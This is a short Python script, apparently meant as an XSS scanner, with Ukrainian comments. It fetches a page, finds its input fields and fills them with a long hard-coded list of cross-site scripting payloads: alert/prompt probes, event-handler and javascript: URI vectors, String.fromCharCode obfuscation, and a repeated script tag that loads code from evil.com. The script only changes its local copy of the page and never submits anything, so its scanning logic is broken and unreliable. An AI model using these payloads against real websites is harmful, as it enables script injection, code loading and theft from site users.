import requests
from bs4 import BeautifulSoup
import json

def xss():
    url = input("Enter the URL: ")
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    inputs = soup.find_all('input')

    # Отримання певних значень зі списку для введення в інпути
    values =  [
"<script>alert('XSS')</script>",
"<img src=\"x\" onerror=\"alert('XSS')\">",
"<svg onload=\"alert('XSS')\">",
"<script>console.log('XSS')</script>",
"<a href=\"javascript:alert('XSS')\">Klick hier!</a>",
"<input type=\"text\" value=\"XSS\">",
"<img src=\"x\" onmouseover=\"alert('XSS')\">",
"<iframe src=\"javascript:alert('XSS')\"></iframe>",
"<script src=\"https://evil.com/malicious.js\"></script>",
"<img src=\"x\" onerror=\"javascript:alert('XSS')\">",
"<svg onload=\"javascript:alert('XSS')\">",
"<script>document.write('XSS')</script>",
"<a href=\"javascript:console.log('XSS')\">Klick hier!</a>",
"<input type=\"text\" value=\"<script>alert('XSS')</script>\">",
"<img src=\"x\" onmouseover=\"javascript:alert('XSS')\">",
"<iframe srcdoc=\"<script>alert('XSS')</script>\"></iframe>",
"<img src=x onerror=\"alert(String.fromCharCode(88,83,83))\">",
"<svg onload=\"alert(String.fromCharCode(88,83,83))\">",
"<script>console.log(String.fromCharCode(88,83,83))</script>",
"<a href=\"javascript:alert(String.fromCharCode(88,83,83))\">Klick hier!</a>",
"<input type=\"text\" value=\"&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;\">",
"<img src=\"x\" onmouseover=\"alert(String.fromCharCode(88,83,83))\">",
"<iframe src=\"javascript:alert(String.fromCharCode(88,83,83))\"></iframe>",
"<script src=\"https://evil.com/malicious.js\"></script>",
"<img src=\"x\" onerror=\"javascript:alert(String.fromCharCode(88,83,83))\">",
"<svg onload=\"javascript:alert(String.fromCharCode(88,83,83))\">",
"<script>document.write(String.fromCharCode(88,83,83))</script>",
"<a href=\"javascript:console.log(String.fromCharCode(88,83,83))\">Klick hier!</a>",
"<input type=\"text\" value=\"<script>alert(String.fromCharCode(88,83,83))</script>\">",
"<img src=\"x\" onmouseover=\"javascript:alert(String.fromCharCode(88,83,83))\">",
"<iframe srcdoc=\"<script>alert(String.fromCharCode(88,83,83))</script>\"></iframe>",
"<img src=x onerror=\"alert('XSS')\">",
"<svg onload=\"alert('XSS')\">",
"<script>console.log('XSS')</script>",
"<a href=\"javascript:alert('XSS')\">Klick hier!</a>",
"<input type=\"text\" value=\"XSS\">",
"<img src=\"x\" onmouseover=\"alert('XSS')\">",
"<iframe src=\"javascript:alert('XSS')\"></iframe>",
"<script src=\"https://evil.com/malicious.js\"></script>",
"<img src=\"x\" onerror=\"javascript:alert('XSS')\">",
"<svg onload=\"javascript:alert('XSS')\">",
"<script>document.write('XSS')</script>",
"<a href=\"javascript:console.log('XSS')\">Klick hier!</a>",
"<input type=\"text\" value=\"<script>alert('XSS')</script>\">",
"<img src=\"x\" onmouseover=\"javascript:alert('XSS')\">",
"<iframe srcdoc=\"<script>alert('XSS')</script>\"></iframe>",
"<img src=x onerror=\"alert(String.fromCharCode(88,83,83))\">",
"<svg onload=\"alert(String.fromCharCode(88,83,83))\">",
"<script>console.log(String.fromCharCode(88,83,83))</script>",
"<a href=\"javascript:alert(String.fromCharCode(88,83,83))\">Klick hier!</a>",
"<input type=\"text\" value=\"&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;\">",
"<img src=\"x\" onmouseover=\"alert(String.fromCharCode(88,83,83))\">",
"<iframe src=\"javascript:alert(String.fromCharCode(88,83,83))\"></iframe>",
"<svg/onload=alert('XSS')>",
"<img/src=x onerror=alert('XSS')>",
"<script>alert`XSS`</script>",
"<a href=\"javascript:alert`XSS`\">Klick hier!</a>",
"<input type=\"text\" value=\"javascript:alert`XSS`\">",
"<img src=\"x\" onmouseover=\"alert`XSS`\">",
"<iframe src=\"data:text/html,<script>alert('XSS')</script>\"></iframe>",
"<img src=x onerror=\"prompt('XSS')\">",
"<svg onload=\"prompt('XSS')\">",
"<script>console.log`XSS`</script>",
"<a href=\"javascript:prompt`XSS`\">Klick hier!</a>",
"<input type=\"text\" value=\"javascript:prompt`XSS`\">",
"<img src=\"x\" onmouseover=\"prompt`XSS`\">",
"<iframe src=\"data:text/html,<script>prompt('XSS')</script>\"></iframe>",
"<img/src=x onerror=prompt('XSS')>",
"<svg onload=prompt('XSS')>",
"<script>console.log('XSS')</script>",
"<a href=\"javascript:prompt('XSS')\">Klick hier!</a>",
"<input type=\"text\" value=\"javascript:prompt('XSS')\">",
"<img src=\"x\" onmouseover=\"prompt('XSS')\">",
"<iframe src=\"data:text/html,<script>prompt('XSS')</script>\"></iframe>",
]


    # Введення значень в інпути
    for i, input_tag in enumerate(inputs):
        if i < len(values):
            input_tag['value'] = values[i]

    # Збереження у JSON форматі як відгук

    data = {
        "website": url,
        "inputs": {input_tag['name']: input_tag['value'] for input_tag in inputs}
    }

    with open('response.json', 'w') as f:
        json.dump(data, f)